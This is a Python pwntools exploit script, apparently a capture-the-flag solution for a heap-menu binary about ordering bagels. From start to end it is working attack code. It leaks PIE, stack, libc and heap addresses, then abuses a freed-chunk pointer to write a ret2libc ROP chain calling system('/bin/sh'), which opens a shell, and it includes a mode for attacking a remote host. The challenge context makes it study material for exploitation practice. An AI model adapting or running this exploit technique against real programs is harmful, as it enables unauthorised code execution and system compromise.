#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import re

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *update_profile+261
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def order_bagel(flavor):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b":", flavor)


def view_order(idx, heap=False):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b": ")
    data = io.recv(6)
    if not heap:
        return u64(data.ljust(8, b"\x00")) 
    else:
        data = data[:5].rjust(6, b"\x00")
        return u64(data.ljust(8, b"\x00")) 


def edit_bagel(idx, new_data):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", new_data)


def cancel_order(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b":", str(idx).encode())


def show_profile():
    io.sendlineafter(b">", b"5")
    io.recvuntil(b"age: ")
    data = io.recvlines(4)
    integers = []
    for i in data:
        match = re.findall(rb"[+-]?\d+", i)
        integers.append(int(match[0]) & 0xffffffff)
    pie = (integers[1] << 32) | integers[0]
    stack = (integers[3] << 32) | integers[2]
    return pie, stack


def update_profile(size, name, start=False):
    if not start:
        io.sendlineafter(b">", b"6")

    io.sendlineafter(b":", str(size).encode())
    io.sendlineafter(b":", name)


def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val 


def solve():

    update_profile(0x10, b"A"*8, start=True)
    pie, stack = show_profile()
    exe.address = pie - 0x24b8
    stack -= 0x20

    info("elf base: %#x", exe.address)
    info("stack: %#x", stack)

    order_bagel(b"B"*8)
    cancel_order(0)
    update_profile(0x8, p64(exe.got["puts"]))
    puts = view_order(0)
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    mp_ = libc.sym["mp_"]
    sbrk_base = mp_ + 96 + 1 # extra byte to pad null for printf 
    
    order_bagel(b"C"*8)
    cancel_order(1)
    update_profile(0x8, p64(sbrk_base))
    heap_base = view_order(1, heap=True)
    info("heap base: %#x", heap_base)

    order_bagel(b"chunk1")
    order_bagel(b"chunk2")
    cancel_order(2)
    cancel_order(3)

    """
    fuck i just realised i don't need to leak heap, stack i have is enough!
    """

    update_profile(0x8, p64(stack))

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    system = libc.sym["system"]
    sh = next(libc.search(b"/bin/sh\x00"))

    ropchain = flat(
        [
            pop_rdi,
            sh,
            ret,
            system
        ]
    )

    edit_bagel(3, ropchain)
    # update_profile(0x10, b"trigger?")


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

